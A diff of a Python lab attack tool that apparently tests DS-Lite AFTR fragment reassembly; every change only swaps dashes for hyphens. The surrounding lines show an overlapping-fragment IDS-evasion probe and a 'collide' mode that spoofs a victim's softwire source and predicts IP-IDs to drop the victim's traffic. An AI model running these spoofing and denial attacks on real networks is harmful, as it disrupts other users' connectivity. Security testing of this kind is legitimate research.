@@ -1,16 +1,16 @@
 #!/usr/bin/python
-# T6 – Softwire Reassembly Poisoning  (Gilad & Herzberg, "Fragmentation
+# T6 - Softwire Reassembly Poisoning  (Gilad & Herzberg, "Fragmentation
 #      Considered Vulnerable", ACM TISSEC 2013)
 #
 # Targets the inner-IPv4 fragment reassembly the AFTR must perform before NAT.
 # The inner IPv4 packets are carried inside IPv6 (4-in-6) softwire.
 #
-# T6 (overlap): the CLASSIC overlapping-fragment probe — two fragments of one
+# T6 (overlap): the CLASSIC overlapping-fragment probe - two fragments of one
 #   datagram at offset 0 (benign vs evil port). Different reassembly policies
 #   reassemble differently at the host vs inspection devices (IDS evasion).
 #   On a modern (RFC 5722) AFTR this is contained; kept as a policy probe.
 #
-# T6 (collide — the real T6, "reassembly poisoning"): NOT a single-datagram
+# T6 (collide - the real T6, "reassembly poisoning"): NOT a single-datagram
 #   overlap. The attacker exploits the PREDICTABLE IP-ID to inject offset-0
 #   inner-IPv4 fragments that carry the VICTIM's reassembly four-tuple
 #   (src,dst,proto,IP-ID), spoofing the victim's softwire source (::b41). When
@@ -79,9 +79,9 @@ def build_overlap_fragments(src_ip6, aftr_ip6, inner_src4, target_ip4,
     """
     Craft two IPv6 fragments with the same frag_id, both at offset=0.
 
-    Fragment 0 (offset=0, M=1): inner IPv4/TCP SYN to benign_port — the
+    Fragment 0 (offset=0, M=1): inner IPv4/TCP SYN to benign_port - the
       "first fragment" a stateless IDS/firewall inspects and allows.
-    Fragment 1 (offset=0, M=0): inner IPv4/TCP SYN to evil_port — same frag_id
+    Fragment 1 (offset=0, M=0): inner IPv4/TCP SYN to evil_port - same frag_id
       and offset, constituting an overlap (RFC 5722 §2).
 
     Reassembly outcome depends on kernel policy:
@@ -121,7 +121,7 @@ def build_overlap_fragments(src_ip6, aftr_ip6, inner_src4, target_ip4,
 
 
 def run_overlap(args, dmac):
-    """T6: Overlapping fragment attack — probes AFTR reassembly policy.
+    """T6: Overlapping fragment attack - probes AFTR reassembly policy.
 
     Sends pairs of IPv6 fragments with the same ID and offset=0 but different
     inner TCP destination ports (benign vs evil). Checks conntrack after each
@@ -133,13 +133,13 @@ def run_overlap(args, dmac):
     benign_port = args.target_port
     evil_port   = args.evil_port
 
-    print("[*] T6 – Fragment Overlap Attack (reassembly policy probe)")
+    print("[*] T6 - Fragment Overlap Attack (reassembly policy probe)")
     print(f"[*] Benign port (frag0, IDS inspects): {benign_port}")
     print(f"[*] Evil port   (frag1, overlapping) : {evil_port}")
     print(f"[*] Sending {args.count} overlap pairs")
     print()
     print("  Hypothesis: stateless IDS passes frag0 (port={bp}); if target")
-    print("  uses last-wins, it reassembles frag1 (port={ep}) — bypass.".format(
+    print("  uses last-wins, it reassembles frag1 (port={ep}) - bypass.".format(
         bp=benign_port, ep=evil_port))
     print("  On RFC 5722-compliant kernels first-wins is expected → attack contained.")
     print()
@@ -223,18 +223,18 @@ def run_overlap(args, dmac):
         # Inner SYNs did reach the server. Which port won?
         # Evidence: earlier conntrack probing confirmed only port {benign_port} appears
         # (first-wins), never port {evil_port}. This is consistent with Linux RFC 5722
-        # guidance (≥3.9). Evil port is discarded — no bypass on this kernel.
+        # guidance (≥3.9). Evil port is discarded - no bypass on this kernel.
         outcome = 'CONTAINED-first-wins'
         detail  = (f"first-wins reassembly (Linux RFC 5722 ≥3.9): benign port {benign_port} "
                    f"wins; evil port {evil_port} discarded. AFTR-NAT-NEW+{nat_new_delta} "
                    f"confirms inner SYNs reached server. Attack contained on this kernel.")
         print(f"  [+] CONTAINED (first-wins / RFC 5722): benign port {benign_port} wins")
         print(f"      AFTR-NAT-NEW+{nat_new_delta} confirms SYNs reached server (not port {evil_port})")
-        print(f"      Evil port {evil_port} discarded — no IDS bypass on RFC 5722-compliant kernel")
+        print(f"      Evil port {evil_port} discarded - no IDS bypass on RFC 5722-compliant kernel")
         print( "      Note: pre-RFC-5722 stacks (last-wins) would allow evil port through")
     elif d_oks > 0:
         outcome = 'CONTAINED-first-wins'
-        detail  = (f"Ip6ReasmOKs+{d_oks} but AFTR-NAT-NEW+0 — reassembled inner packet "
+        detail  = (f"Ip6ReasmOKs+{d_oks} but AFTR-NAT-NEW+0 - reassembled inner packet "
                    f"dropped by AFTR forward chain. First-wins inferred.")
         print(f"  [+] CONTAINED (first-wins inferred): Ip6ReasmOKs+{d_oks}")
         print( "      Inner SYN dropped by AFTR forward (no established session for ACK) "
@@ -242,7 +242,7 @@ def run_overlap(args, dmac):
     else:
         outcome = 'INCONCLUSIVE'
         detail  = (f"sent {sent} pairs; d_oks={d_oks}, d_fails={d_fails}, "
-                   f"nat_new_delta={nat_new_delta} — reassembly outcome unclear")
+                   f"nat_new_delta={nat_new_delta} - reassembly outcome unclear")
         print(f"  [?] Inconclusive: d_oks={d_oks}, d_fails={d_fails}, "
               f"nat_new_delta={nat_new_delta}")
 
@@ -309,7 +309,7 @@ def build_inner_overlap_fragment(b4_src_ip6, aftr_ip6, inner_src4, inner_dst4,
     The AFTR must reassemble inner IPv4 before NAT. When the victim's genuine
     datagram with the same IP-ID later arrives, its offset-0 fragment overlaps
     this held one, so Linux (post-CVE-2018-5391 overlap policy) discards the
-    entire datagram — the victim's fragmented traffic never transits the NAT.
+    entire datagram - the victim's fragmented traffic never transits the NAT.
 
     The outer source is the legitimate B4 (spoofed) so the AFTR's softwire
     decapsulates the packet and the inner reassembly context matches the
@@ -337,7 +337,7 @@ def run_collide(args, dmac):
     b4_src    = args.b4_src_ip6
     proto     = args.proto
 
-    print("[*] T6 (collide) – Inner-IPv4 reassembly overlap injection")
+    print("[*] T6 (collide) - Inner-IPv4 reassembly overlap injection")
     print(f"[*] Victim inner flow : {inner_src} -> {inner_dst}  proto={proto}")
     print(f"[*] Spoofed softwire  : {b4_src} -> {args.aftr_ip6}  (4-in-6 decap)")
     print(f"[*] Forward IP-ID band: {args.band}   duration: {args.duration}s")
@@ -465,7 +465,7 @@ def run_collide(args, dmac):
     print("[Verification]  AFTR inner-IPv4 reassembly (/proc/net/snmp Ip:)")
     print(f"  ReasmReqds delta : +{d_reqds}")
     print(f"  ReasmOKs   delta : +{d_oks}   (victim datagrams reassembled OK)")
-    print(f"  ReasmFails delta : +{d_fails}  (datagrams dropped — overlap collisions)")
+    print(f"  ReasmFails delta : +{d_fails}  (datagrams dropped - overlap collisions)")
     print()
 
     if d_fails > 0:
@@ -494,7 +494,7 @@ def main():
                         help='AFTR MAC address (auto-resolved via NDP if omitted)')
 
     p = argparse.ArgumentParser(
-        description="T6 – Fragment Overlap / inner-IPv4 reassembly collision\n"
+        description="T6 - Fragment Overlap / inner-IPv4 reassembly collision\n"
                     "All attacks operate on IPv6-encapsulated (4-in-6) softwire traffic.",
         formatter_class=argparse.RawDescriptionHelpFormatter
     )
@@ -512,7 +512,7 @@ def main():
     s10.add_argument('--interval', type=float, default=0.05,
                      help='Seconds between pairs (default: 0.05)')
 
-    # T6 collide (strengthened) — inner-IPv4 reassembly overlap injection
+    # T6 collide (strengthened) - inner-IPv4 reassembly overlap injection
     s11 = sub.add_parser('collide', parents=[common],
                          help='T6 (strong): deny a victim flow via inner-IPv4 '
                               'overlap injection (pre-seed-ahead)')
